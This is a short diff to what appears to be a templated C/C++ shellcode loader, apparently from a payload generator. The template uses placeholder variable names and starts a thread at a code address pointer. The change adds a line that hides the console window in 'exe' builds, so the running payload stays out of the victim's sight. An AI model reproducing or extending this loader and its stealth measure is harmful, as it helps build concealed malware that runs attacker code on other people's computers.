@@ -28,6 +28,7 @@ int main(int {{ index .V "argc" }}, char** {{ index .V "argv" }}) {
 	HANDLE {{ index .V "hThread" }} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){{ index .V "addressPointer" }}, NULL, 0, 0);
 
 	{{ if eq .Format "exe" }}
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 	WaitForSingleObject({{ index .V "hThread" }}, INFINITE);
 	{{ end }}
 
